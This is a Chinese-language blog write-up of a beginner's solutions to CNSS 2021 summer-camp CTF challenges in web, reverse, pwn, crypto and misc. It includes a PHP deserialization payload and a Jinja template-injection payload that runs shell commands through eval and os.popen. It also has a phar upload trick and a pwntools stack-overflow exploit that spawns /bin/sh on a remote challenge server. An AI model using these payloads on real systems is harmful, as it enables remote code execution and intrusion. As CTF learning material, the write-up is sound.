# CNSS2021夏令营游记


## 写在前面

​	第一次玩CTF属于是，萌新吓傻了。

## Web

### 	0x01 第一次冒险

​		按照网页提示操作，最后结合提示在cookie中得到一个字符串，使用base64解密得到flag

### 	0x02 更简单的计算题

​		算出来发现提交不了？F12修改输入框的长度限制和提交按钮的disable状态，提交得到flag

### 	0x03 卖菜刀

​		依照题目，使用工具中国菜刀，在网站根目录可以找到flag文件。

### 0x04 最好的语言？

​		这个题有点难，搞了好久。具体就是利用php的反序列化漏洞，即最后会将GET到的interesting参数反序列化。而我们可以利用这一点在interesting变量中加入代码让它执行达到目的。

​		class中的wakeup()函数会在对象被反序列化的时候执行，destruct()函数会在对象被销毁时执行。观察一下当a=&#39;1&#39;,b=&#39;2&#39;,c=&#39;3&#39;时对象就会在被销毁时输出flag。（注意是字符类型的123）而wakeup()函数会把abc修改成数值类型的123。而众所周知，对象会在程序执行结束后被销毁。所以我们的目的就是：利用反序列化漏洞构造一个Flag类的参数t，并且绕过其反序列化时执行的wakeup()直接执行destruct()。

​		那么怎么绕过wakeup()呢？

​		百度搜索可以得知：在某些php版本中，如果表示对象属性个数的值大于真实的属性个数时就会跳过wakeup()的执行。写个代码看看对象序列化之后啥样：

```php
class Flag {
    public $a = &#39;1&#39;;
    protected $b = &#39;2&#39;;
    private $c = &#39;3&#39;;

    function __construct() {
        $this-&gt;a = &#39;1&#39;;
        $this-&gt;b = &#39;2&#39;;
        $this-&gt;c = &#39;3&#39;;
    }

}

$t = new Flag();

echo serialize($t);
```

得到结果：

```
O:4:&#34;Flag&#34;:3:{s:1:&#34;a&#34;;s:1:&#34;1&#34;;s:4:&#34;%00*%00b&#34;;s:1:&#34;2&#34;;s:7:&#34;%00Flag%00c&#34;;s:1:&#34;3&#34;;}
```

其中%00是一个空字符，%00*%00表示protected类型，%00Flag%00表示private类型。

&#34;Flag&#34;后面那个数字便是对象数量。按照上文的漏洞修改一下。

```
O:4:&#34;Flag&#34;:114514:{s:1:&#34;a&#34;;s:1:&#34;1&#34;;s:4:&#34;%00*%00b&#34;;s:1:&#34;2&#34;;s:7:&#34;%00Flag%00c&#34;;s:1:&#34;3&#34;;}
```

传入$interesting变量得到flag。

### 0x05 你要玩蛇吗

看到蛇，猜想和~~Arcaea~~Python有关。点进去用眼睛瞪，发现网页GET了一个name字段并显示在网页上。

使用BurpSuite的Repeater功能看到有一个Server：gunicorn字样，谷歌一下发现确实是一个python的webserver，猜测入手点是python。

众所周知（其实是别人告诉我的），有一个优秀的python web框架叫Flask，默认使用jinja引擎。熟练运用搜索引擎获得一个漏洞示例（下已改为题目格式）

```python
def cum(name):
	tp = &#39;{{name}}超喜欢玩蛇哦&#39;
	return render_template_string(tp, name=name)
```

其中render_template_string是jinja引擎的模板渲染函数。其中{{name}}表示name变量的值。那么如果我在浏览器地址栏中令/?name={{Fuc1()}}( 其中Fuc1()是一个函数)会发生什么呢？

**函数Fuc1()的返回值将会显示在页面中**

接下来几步涉及Python基础。

1. `__globals__`：每个python函数都含有一个`__globals__`字典，存储“在本函数中可以存储的全局变量”列表。其中一定有一个`__builtins__`变量。
2. `__builtins__`：我们知道，Python 需要 import 才能引用其他包的函数。但由于一部分函数实在过于常用，所以无需引入也能用。它们就是 `__builtins__` 字典中的函数。
    比如： `print, open, chr, len, abs, eval`
3. `eval`：Python的`eval`是把一个字符串当作代码来执行。

也就是我们需要找到一个函数`fun`，调用`fun.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]()`即可在网站上执行任意代码。

如何找到一个函数呢？搜索得到flask框架中有一个可以直接调用的函数`url_for()`。

那么我们需要执行什么代码呢？有如下语句：

`__import__(&#34;os&#34;).popen(&#34;...&#34;).read()`

作用是引入os并调用，返回程序输出。试试直接`cat`一下`flag`？

`/?name={{url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](__import__(&#34;os&#34;).popen(&#34;cat flag&#34;).read())}}`

发现页面上出现了flag，好神奇哦。

### 0x06 给我康康你的照片

其实我开这题只是想看看有没有别的小可爱传照片，但是其实看不到，恼火。

我实在做不出来，索性使用中国御剑扫描网站目录看到有一个robots.txt文件，点进去发现让我访问s3cr3t.php，立即访问。

其实正确做法是F12看到源码中有一段注释内含“机器人”字样想到访问robots.txt

进行代码审计，发现GET了一个`$interesting`变量，并将其作为文件路径，将文件内容读入到`$file`中。由于`file_get_contents()`的返回值不是空就是字符串，我们无法在返回值上做手脚。考虑搞一个在访问时触发的木马。

考虑构造一个`phar`文件，在读取时利用`phar://`伪协议直接执行其中代码。参照`0x04 最好的语言？`题，我们需要构造一个Flag类型对象并赋值好初始值写入`phar`中，利用`__destruct()`函数输出`flag`。

谷歌一个`phar`文件构造代码，直接进行一个使用：

```php
&lt;?php
    class Flag {
    public $a;
    protected $b;
    private $c;

    function __construct() {
        $this-&gt;a = &#39;1&#39;;
        $this-&gt;b = &#39;2&#39;;
        $this-&gt;c = &#39;3&#39;;
    }
    }
    $phar = new Phar(&#34;phar.phar&#34;);
    $phar-&gt;startBuffering();
    $phar-&gt;setStub(&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;);
    $o = new Flag();
    $phar-&gt;setMetadata($o);
    $phar-&gt;stopBuffering();
?&gt;
```

执行得到phar.phar文件，后缀名改为`png`上传。

访问`/s3cr3t.php?interesting=phar://./upload/.../...png`，发现页面上出现了flag，好神奇哦。

## Reverse

### 	0x01 Hello Reverse

​		使用ida反编译后即可看到flag

### 	0x02 Where Are U

​		使用ida反编译后到处找找就有了

### 	0x03 吸/吸嘉嘉

​		反编译后发现程序将flag的每一位字母按位非(~)后与code数组比对。找到code数组，将每一位按位非之后就可以得到答案了。

​		我是手算的，我可能是弱智。

### 0x04 抽奖得flag

​		这个题按理说是要使用动态调试，但是不难发现程序中有在满足某个条件时调用一个程序输出flag。直接利用IDA的patch program功能在程序最开头直接调用该程序，运行得到flag。

### 	0x05 没想好名字的题目

​		反编译之后先把变量名改成人能看的，然后发现三个for套for分别在判断行、列、方块是否有重复数字。结合程序名称发现是数独。分析程序前半部分，发现数独的形成模式是将flag[]的数字填入a[]中值为0的部分中。找到a的初始值，做数独即可得到flag。

### 0x0? 攻壳机动队

​		使用upx去壳，然后是一个走迷宫小游戏。在内存里找到迷宫，直接走就可以了。

### 0x0?  黑客帝国

​		反编译发现输入30个数，然后if了三十个方程。把方程搞出来跑一遍高斯消元得到flag。

## Pwn

### 0xFF（番外）Maze

​	连接服务器之后得到一个随机的迷宫，跑一遍深度优先搜索得到结果。

```python
from pwn import *
import time
import sys
sys.setrecursionlimit(114514)
p = remote(&#34;120.25.225.38&#34;, 32121)
st = p.recvline(keepends = False)
st = p.recvline(keepends = True)
n = 20
m = 22
a = []
fx = (0, 1, 0, -1)
fy = (1, 0, -1, 0)
op = (&#39;d&#39;, &#39;s&#39;, &#39;a&#39;, &#39;w&#39;)
tpp = 0
flag = 0
opts = []
vis = []
mx = 0

def dfs(x, y):
	if flag == 1:
		return
	if x == n-1 and y == m-1:
		print(&#34;done&#34;)
		ans = &#34;&#34;
		for i in range(tpp):
			ans &#43;= opts[i]
		p.sendline(ans.encode())
		p.sendline(&#34;d&#34;.encode())
		for i in range(tpp):
			print(p.recv())
		print(p.recv())
		flag = 1
		return
	vis[x][y] = 1
	for i in range(0, 4):
		dx = x &#43; fx[i]
		dy = y &#43; fy[i]
		if dx &gt;= 0 and dx &lt; n and dy &gt;= 0 and dy &lt; m:
			if vis[dx][dy] == 0 and a[dx][dy] == 0:
				if tpp == mx:
					opts.append(op[i])
					tpp = tpp &#43; 1
					mx = mx &#43; 1
				else:
					opts[tpp] = op[i]
					tpp = tpp &#43; 1
				dfs(dx, dy)
				tpp = tpp - 1
		if flag == 1:
			return
	vis[x][y] = 0

for i in range(0, n):
	a.append([])
	vis.append([])
	st = p.recvline(keepends = True)
	dat = st.decode()
	for j in range(0, m):
		if dat[j] == &#39;#&#39;:
			a[i].append(1)
		else:
			a[i].append(0)
		vis[i].append(0)

st = p.recvline(keepends = True)
st = p.recvline(keepends = True)
st = p.recvline(keepends = True)

dfs(0, 0)
```



### 0x01 让我康康你的Nc

​	安装netcat，按题目方式连接之后cat flag即可得到结果。

### 0x02 网安的第一口饭

​	简单栈溢出。反编译看到有一个here(void)调用了system(&#34;/bin/sh&#34;)，也就是说只要调用该程序便能获得类似shell的东西，可以直接cat flag。

​	

```python
from pwn import *

p = remote(&#39;111.200.241.244&#39;, 59471)
p.recv()
payload = b&#39;a&#39; * 12 &#43; p64(0x4011F5)
p.send(payload)
p.interactive()
```



## Crypto

~~最有意思的难道不是crypto吗~~

### 龙王的代码I

​	看程序发现flag就是1000000之内素数的平方和。随便写个线性筛就可以得到答案了。

```cpp
#include &lt;bits/stdc&#43;&#43;.h&gt;
using namespace std;
const int MAXN = 10000050;
int notp[MAXN], cntp, p[MAXN], n, m;
long long ans;
int main() {
	n = 1000000; notp[1] = 1;
	for(int i = 2; i &lt;= n; &#43;&#43;i) {
		if(!notp[i]) p[&#43;&#43;cntp] = i;
		for(int j = 1; 1ll*i*p[j] &lt;= n &amp;&amp; j &lt;= cntp; &#43;&#43;j) {
			notp[i*p[j]] = 1;
			if(i % p[j] == 0) break;
		}
	}
	for(int i = 2; i &lt;= n; &#43;&#43;i)
        ans &#43;= (1 - notp[i]) * i * i;
    printf(&#34;%lld\n&#34; ans);
}
//这份代码有一些小错误，直接抄写跑不出答案的哦！但是代码逻辑完全正确
```

### eeeeeezrsa

​	通过RSA解码方式直接求得即可。

### 龙王的代码II

​	阅读代码发现即求：


$$
x\ ≡\ a1\ (mod\ p1)$$
$$x\ ≡\ a2\ (mod\ p2)$$
$$x\ ≡\ a3\ (mod\ p3)$$
$$x\ ≡\ a4\ (mod\ p4)
$$


方程组中x的值。敲一遍扩展中国剩余定理板子即可得到结果。

### Feistal

​	阅读代码，发现经过一次single操作后：
$$
L&#43;R$$
$$↓$$
$$R&#43;L\ xor\ R\ xor\ k
$$
​	而xor（异或）运算具有以下性质：
$$
a\ xor\ a = 0$$
$$a\ xor\ 0 = a$$
$$a\ xor\ b = b\ xor\ a
$$
​	程序为single操作执行256次的结果。那么我们先假设没有xor k操作来看看：
$$
L&#43;R$$
$$↓$$
$$R&#43;L\ xor\ R$$
$$↓$$
$$L\ xor\ R&#43;L\ xor\ R\ xor\ R$$
$$=L\ xor\ R&#43;L$$
$$↓$$
$$L&#43;L\ xor\ R\ xor\ L$$
$$=L&#43;R
$$
​	发现经过3次single操作后，回去了，神奇吧。由256 mod 3 = 1得如果没有每次xor k操作的话得到的序列将是L xor R &#43; R（注意到最后有一个swap操作）

​	考虑中间k值带来的影响。由于xor操作具有可交换性，所以左右各异或上一堆随机东西就相当于异或上这些东西的异或和。即最后的序列是：
$$
L\ xor\ R\ xor\ key1&#43;R\ xor\ key2
$$
通过fake_flag和其加密结果求得key1，key2之后反向操作得到flag。

### 龙王的代码III

即求：
$$
x^2≡a(mod\ p)
$$
二次剩余模板，打完就行了。

```python
import random

n = 7705321458598879497
p = 12979492918818656033

w = 0
def MUL(ax, ay, bx, by):
	return (ax * bx % p &#43; ay * by * w % p) % p, (ax * by % p &#43; ay * bx % p) % p

def power(x, y, b):
	ax, ay = 1, 0
	while b != 0:
		if b % 2 == 1: ax, ay = MUL(ax, ay, x, y)
		x, y = MUL(x, y, x, y)
		b //= 2
	return ax % p

while 1 == 1:
	a = random.randint(0, p)
	w = ((a * a % p - n) % p &#43; p) % p
	if pow(w, (p-1)//2, p) == p-1: break
print(p - power(a, 1, (p&#43;1)//2))

#这份代码有一些小错误，直接抄写跑不出答案的哦！但是代码逻辑完全正确
```

这个数超过了C&#43;&#43;能存的范围了（除非写高精），所以被迫写了python。

### Caesar?!?

本专题最水的题目，你只需要把encrypto反着写一遍就有结果了。程序我都没保存。

### PRNG

这是一个线性同余生成器攻击。

首先，如果我们找到几个X，使得X = 0 (mod n) 但 X ≠ 0

此时，也就找到了几个X是n的倍数。那么这些X的最大公因数就有很大可能等于n，不是吗？

回到题目，我们相当于得到了几个同余方程：
$$
s_1 ≡ s_0×a&#43;b\ (mod \ n)
$$

$$
s_2 ≡ s_1×a&#43;b\ (mod \ n)
$$

$$
s_3 ≡ s_2×a&#43;b\ (mod \ n)
$$

此时我们引入一个数列$T_n=S_{n&#43;1}-S_n$

$$ T_0≡S_1-S_0\ (mod\ n) $$

$$ T_1≡S_2-S_1≡(S_1×a&#43;b)-(S_0×a&#43;b)≡a×(S_1-S_0)≡a×T_0\ (mod\ n) $$

$$ T_2≡S_3-S_2≡(S_2×a&#43;b)-(S_1×a&#43;b)≡a×(S_2-S_1)≡a×T_1\ (mod\ n) $$

$$ T_4≡S_4-S_3≡(S_3×a&#43;b)-(S_2×a&#43;b)≡a×(S_3-S_2)≡a×T_2\ (mod\ n) $$

这时候，神奇的事情发生了：

$$T_2T_0-T_1^2≡(a×a×T_0×T_0)-(a×T_0×a×T_0)≡0(mod\ n)$$

如此构造，就可以求出一些$X\ mod\ n=0$，从而求出$n$（事实上，可能要多试几次）

有了$n$，还有$a$、$b$，咋办捏。

$$ s_2 ≡ s_1×a&#43;b\ (mod \ n) $$
$$
s_3 ≡ s_2×a&#43;b\ (mod \ n)
$$
$$ s_3-s_2=s_2×a-s_1×a=a×(s_2-s_1) (mod\ n)$$

$$ a=(s_3-s_2)/(s_2-s_1) (mod\ n)$$

好耶。然后$b$随便解一下这题就结束了。

## Misc

### Misc的文件

下载解压，看到文件start.exe。记事本打开，前面写着PK。所以这是一个压缩包，改后缀名为zip打开。解压后发现两个文件，都用记事本打开。发现一个里面是一串字符，另一个文件头是PK。把文件头是PK的后缀名改为zip解压发现需要密码，输入刚刚获得的字符，解压获得flag。

### No Password

总之我当时把Hello.png后缀名改成7z就成功了，但再试一遍发现不行了，怎么回事呢。

### 爱要大声说出来

按照大小写转换成一串二进制数。已知开头是cnss，搜索自己的DNA得到c和n的ASCII码的二进制，前几位刚刚好是c和n的二进制ASCII，字符间用0隔开。长度固定分隔一下翻译回来得到flag。

### baaby task

下载，记事本打开。

### another bb

下载，看不出啥端倪。根据文件类型PNG推测是LSB隐写。Stegsolve打开查看RGB的第0位得到答案。

### Casio3超爱Emoji

百度搜索：emoji加密

## 我就会到这里了，我好菜啊。



---

> Author: Shino  
> URL: https://www.sh1no.icu/posts/cnsssummer/  

